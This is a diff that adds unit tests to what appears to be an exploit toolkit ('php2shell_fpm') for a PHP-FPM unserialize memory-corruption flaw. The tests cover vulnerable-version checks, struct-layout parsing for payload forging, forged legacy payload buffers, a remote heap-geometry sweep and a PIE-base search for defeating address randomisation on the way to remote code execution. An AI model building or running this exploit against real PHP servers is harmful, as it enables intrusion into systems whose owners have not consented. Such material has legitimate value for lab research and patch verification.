@@ -12,6 +12,7 @@ import json
 import os
 import struct
 import sys
+import tempfile
 import unittest
 from pathlib import Path
 from types import SimpleNamespace
@@ -22,6 +23,7 @@ sys.path.insert(0, str(ROOT / "tools"))
 
 import php2shell_fpm as fpm  # noqa: E402
 import php2shell_fpm_profile as profile_gen  # noqa: E402
+import php2shell_fpm_versions as versions  # noqa: E402
 
 D = 0x7F07BE280000      # lab-observed stale struct address
 K = 0xFE8               # lab-observed reclaim content offset
@@ -233,7 +235,7 @@ class ProfileConsistencyTests(unittest.TestCase):
                          fpm.BG_UNSERIALIZE_LEVEL_OFF)
         self.assertEqual(meta["struct_size"], 8216)
         self.assertEqual(meta["reclaim_size"], SIZE)
-        self.assertEqual(meta["reclaim_pads"], [4096, 4096, 4096])
+        self.assertEqual(meta["reclaim_pads"], [4096, 4096])
 
     def test_fpm_profile_is_rce_verified(self):
         profile = self._profile()
@@ -298,5 +300,231 @@ class FpmLabIntegrationTests(unittest.TestCase):
         self.assertEqual(fpm.cmd_no_oracle(self._args()), 0)
 
 
+class VersionRegistryTests(unittest.TestCase):
+    """The advisory matrix (CVE-2026-109619) has to drive every tool."""
+
+    def test_patched_branch_boundary(self):
+        self.assertTrue(versions.is_vulnerable("8.4.26"))
+        self.assertFalse(versions.is_vulnerable("8.4.27"))
+        self.assertTrue(versions.is_vulnerable("8.2.34"))
+        self.assertFalse(versions.is_vulnerable("8.2.35"))
+        self.assertTrue(versions.is_vulnerable("8.3.35"))
+        self.assertFalse(versions.is_vulnerable("8.3.36"))
+        self.assertTrue(versions.is_vulnerable("8.5.11"))
+        self.assertFalse(versions.is_vulnerable("8.5.12"))
+
+    def test_eol_branches_are_always_vulnerable(self):
+        for version in ("7.2.34", "7.4.33", "8.0.30", "8.1.33"):
+            with self.subTest(version=version):
+                self.assertTrue(versions.is_vulnerable(version))
+                self.assertIsNone(versions.fixed_in(version))
+
+    def test_fixed_in_per_branch(self):
+        self.assertEqual(versions.fixed_in("8.4.26"), "8.4.27")
+        self.assertEqual(versions.fixed_in("8.3.1"), "8.3.36")
+        self.assertIsNone(versions.fixed_in("7.2.1"))
+
+    def test_affected_versions_cover_every_branch(self):
+        affected = versions.affected_versions()
+        for version in ("8.2.34", "8.3.35", "8.4.26", "8.5.11",
+                        "7.2.34", "7.4.33"):
+            self.assertIn(version, affected)
+
+    def test_ports_keep_documented_builds_and_never_collide(self):
+        self.assertEqual(versions.ports_for("8.4.26"), (8110, 8111, 9001, 9002))
+        self.assertEqual(versions.ports_for("8.4.25"), (8130, 8131, 9021, 9022))
+        used: dict[int, str] = {}
+        for version in ("7.2.34", "7.4.33", "8.2.34", "8.3.35",
+                        "8.4.25", "8.4.26", "8.4.27", "8.5.11"):
+            for port in versions.ports_for(version):
+                self.assertNotIn(port, used, f"{version} reuses {port} "
+                                             f"from {used.get(port)}")
+                used[port] = version
+
+    def test_unknown_branch_is_rejected(self):
+        with self.assertRaises(versions.UnknownVersion):
+            versions.ports_for("9.9.9")
+
+    def test_source_detection_uses_the_fix_marker(self):
+        source = ROOT / "lab" / "fpm" / "runtime" / "src"
+        fixed = source / "php-8.4.27.tar.gz"
+        vulnerable = source / "php-8.4.26.tar.gz"
+        if not (fixed.is_file() and vulnerable.is_file()):
+            self.skipTest("release tarballs are not downloaded")
+        self.assertTrue(versions.source_is_fixed(str(fixed)))
+        self.assertFalse(versions.source_is_fixed(str(vulnerable)))
+
+
+class SymbolAliasTests(unittest.TestCase):
+    """PHP <= 7.2 exports the zval destructor as _zval_ptr_dtor."""
+
+    def test_underscore_alias_is_resolved(self):
+        nm = ("00000000001db5d0 t zif_system\n"
+              "0000000000282580 T _zval_ptr_dtor\n"
+              "000000000055a400 B basic_globals\n")
+        self.assertEqual(profile_gen.parse_nm(nm), {
+            "zif_system": 0x1DB5D0,
+            "zval_ptr_dtor": 0x282580,
+            "basic_globals": 0x55A400,
+        })
+
+    def test_missing_symbol_still_fails(self):
+        with self.assertRaisesRegex(ValueError, "missing symbols"):
+            profile_gen.parse_nm("00000000001db5d0 t zif_system\n")
+
+
+LEGACY_SOURCE = """\
+#define VAR_ENTRIES_MAX 1024
+struct php_unserialize_data {
+\tvoid *first;
+\tvoid *last;
+\tvoid *first_dtor;
+\tvoid *last_dtor;
+\tHashTable *allowed_classes;
+};
+"""
+
+MODERN_SOURCE = """\
+#define VAR_ENTRIES_MAX 1018
+struct php_unserialize_data {
+\tvar_entries      *last;
+\tvar_dtor_entries *first_dtor;
+\tvar_dtor_entries *last_dtor;
+\tHashTable        *allowed_classes;
+\tHashTable        *ref_props;
+\tzend_long         cur_depth;
+\tzend_long         max_depth;
+\tvar_entries       entries;
+};
+"""
+
+
+class UnserializeLayoutTests(unittest.TestCase):
+    """The struct shape decides which payload has to be forged."""
+
+    def _parse(self, text: str) -> dict:
+        with tempfile.TemporaryDirectory() as tmp:
+            path = os.path.join(tmp, "ext", "standard")
+            os.makedirs(path)
+            with open(os.path.join(path, "var_unserializer.c"),
+                      "w", encoding="utf-8") as handle:
+                handle.write(text)
+            return profile_gen.parse_unserialize_struct(tmp)
+
+    def test_modern_shape_has_embedded_block(self):
+        parsed = self._parse(MODERN_SOURCE)
+        self.assertFalse(parsed["legacy"])
+        self.assertEqual(parsed["offsets"]["entries"], 56)
+        self.assertEqual(parsed["size"], 56 + 16 + 8 * 1018)
+        self.assertEqual(parsed["var_entries"]["data"], 16)
+        self.assertEqual(parsed["var_entries"]["used_slots"], 0)
+
+    def test_legacy_shape_is_five_pointers(self):
+        parsed = self._parse(LEGACY_SOURCE)
+        self.assertTrue(parsed["legacy"])
+        self.assertEqual(parsed["size"], 40)
+        self.assertEqual(parsed["offsets"],
+                         {"first": 0, "last": 8, "first_dtor": 16,
+                          "last_dtor": 24, "allowed_classes": 32})
+        # data[] first, then used_slots, then next
+        self.assertEqual(parsed["var_entries"]["data"], 0)
+        self.assertEqual(parsed["var_entries"]["used_slots"], 8 * 1024)
+        self.assertEqual(parsed["var_entries"]["next"], 8 * 1024 + 8)
+
+    def test_built_74_layout_is_modern_and_72_is_legacy(self):
+        source = ROOT / "lab" / "fpm" / "runtime" / "src"
+        for version, legacy in (("7.2.34", True), ("7.4.33", False),
+                                ("8.4.26", False)):
+            tree = source / f"php-{version}"
+            if not tree.is_dir():
+                self.skipTest(f"{tree} is not extracted")
+            with self.subTest(version=version):
+                parsed = profile_gen.parse_unserialize_struct(str(tree))
+                self.assertEqual(parsed["legacy"], legacy)
+
+
+class LegacyPayloadTests(unittest.TestCase):
+    """PHP <= 7.3 payloads point first/last at the reclaim buffer itself."""
+
+    LAYOUT = {
+        "unserialize_data": {"first": 0, "last": 8, "first_dtor": 16,
+                             "last_dtor": 24, "allowed_classes": 32,
+                             "size": 40, "legacy": True},
+        "var_entries": {"data": 0, "used_slots": 8 * 1024,
+                        "next": 8 * 1024 + 8, "max": 1024},
+        "zval": {"value": 0, "type_info": 8, "size": 16},
+    }
+
+    def test_primitive_payload_forges_a_separate_block(self):
+        buf = fpm._build_primitive_payload(D, K, SIZE, 424242, self.LAYOUT)
+        buffer_start = D - K
+        self.assertEqual(struct.unpack_from("<Q", buf, K + 0)[0], buffer_start)
+        self.assertEqual(struct.unpack_from("<Q", buf, K + 8)[0], buffer_start)
+        self.assertEqual(struct.unpack_from("<Q", buf, K + 16)[0], 0)
+        self.assertEqual(struct.unpack_from("<Q", buf, K + 24)[0], 0)
+        # data[1] of the block that starts at the buffer head
+        self.assertEqual(struct.unpack_from("<Q", buf, 8)[0], D + 0x300)
+        self.assertEqual(struct.unpack_from("<q", buf, 8 * 1024)[0], 2)
+        self.assertEqual(struct.unpack_from("<I", buf, K + 0x308)[0], 4)
+
+    def test_legacy_payload_fits_the_buffer(self):
+        self.assertLessEqual(K + 8 * 1024 + 8, SIZE)
+
+
+class RemoteSweepTests(unittest.TestCase):
+    """The sweep discovers geometry without reading /proc."""
+
+    def test_grid_starts_from_the_profile_candidates(self):
+        grid = fpm._sweep_grid("8.4.26")
+        size, candidates, _pads = fpm._no_oracle_geometry("8.4.26")
+        self.assertEqual(grid[:len(candidates)],
+                         [(int(c[0]), int(c[1])) for c in candidates])
+        self.assertGreater(len(grid), len(candidates))
+
+    def test_grid_entries_are_unique(self):
+        grid = fpm._sweep_grid("8.4.25")
+        self.assertEqual(len(grid), len(set(grid)))
+
+
 if __name__ == "__main__":
     unittest.main()
+
+
+class PieCodeWindowTests(unittest.TestCase):
+    """The executable window bounds the PIE-base search: the real pointer is
+    tried at the step that reproduces its offset, and every pointer costs at
+    most a handful of endgame attempts."""
+
+    WINDOW = (0x200000, 0x600000)
+
+    def _steps(self, pointer: int) -> list[tuple[int, int]]:
+        """(step, offset) pairs the window would actually try."""
+        aligned = pointer & ~(fpm.MEM_CHUNK - 1)
+        out = []
+        for steps in range(0, 6):
+            candidate = aligned - steps * fpm.MEM_CHUNK
+            offset = pointer - candidate
+            if offset >= self.WINDOW[1]:
+                break
+            if offset < self.WINDOW[0]:
+                continue
+            out.append((steps, offset))
+        return out
+
+    def test_real_handler_pointer_is_tried_at_its_true_base(self):
+        pie = 0x557099000000            # lab-observed 8.4.26 base
+        pointer = pie + 0x4EA787        # execute_ex handler table
+        tried = self._steps(pointer)
+        self.assertIn((2, 0x4EA787), tried)
+        # the step that carries the true base is among the candidates
+        self.assertTrue(any(pointer - (pointer & ~(fpm.MEM_CHUNK - 1))
+                            + step * fpm.MEM_CHUNK == 0x4EA787
+                            for step, _offset in tried))
+
+    def test_search_is_bounded_per_pointer(self):
+        for pointer in (0x5570994EA787, 0x560EECEB6E20, 0x7F784BC8B000):
+            with self.subTest(pointer=hex(pointer)):
+                self.assertLessEqual(len(self._steps(pointer)), 4)
+
+    def test_window_constant_matches_the_shipped_geometry(self):
+        self.assertEqual(fpm.PIE_CODE_WINDOW, self.WINDOW)
